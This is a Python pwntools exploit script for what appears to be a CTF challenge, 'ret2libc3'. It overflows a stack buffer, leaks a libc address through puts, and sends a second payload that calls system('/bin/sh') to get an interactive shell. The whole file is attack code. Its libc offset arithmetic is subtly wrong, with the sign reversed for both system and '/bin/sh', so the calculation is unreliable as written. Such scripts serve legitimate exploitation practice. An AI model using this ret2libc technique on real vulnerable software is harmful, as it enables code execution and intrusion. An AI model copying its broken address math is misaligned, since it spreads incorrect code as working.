from pwn import *

p = process("./ret2libc3")
libc = ELF("./libc.so")

libc_start_main = libc.symbols["__libc_start_main"]
system = libc.symbols["system"]
str_binsh = int(0x0)
for address in libc.search("/bin/sh\x00"):
	str_binsh = address

ret2libc3 = ELF("./ret2libc3")
got_libc_start_main = ret2libc3.got["__libc_start_main"]
plt_puts = ret2libc3.plt["puts"]
main = ret2libc3.symbols["main"]
'''
print(hex(got_libc_start_main))
print(hex(plt_puts))
print(hex(main))
print(hex(str_binsh))
'''
payload1 = "a"*112+p32(plt_puts)+p32(main)+p32(got_libc_start_main)
p.sendlineafter("Can you find it !?",payload1)
#print(p.recv(10))
#print(p.recvline())
#print(p.recvuntil("Can you find it !?"))
#print(p.recvline())

vaddr_libc_start_main = p.unpack()
#print(hex(vaddr_libc_start_main))

vaddr_system = vaddr_libc_start_main + (libc_start_main - system)
vddr_str_binsh = vaddr_libc_start_main + (libc_start_main - str_binsh)

#print(hex(vaddr_got_libc_start_main))
#print(hex(vaddr_system))
#print(hex(vddr_str_binsh))

payload2 = "a"*112 + p32(vaddr_system) + p32(0x0) + p32(vddr_str_binsh)
p.sendline(payload2)
p.interactive()
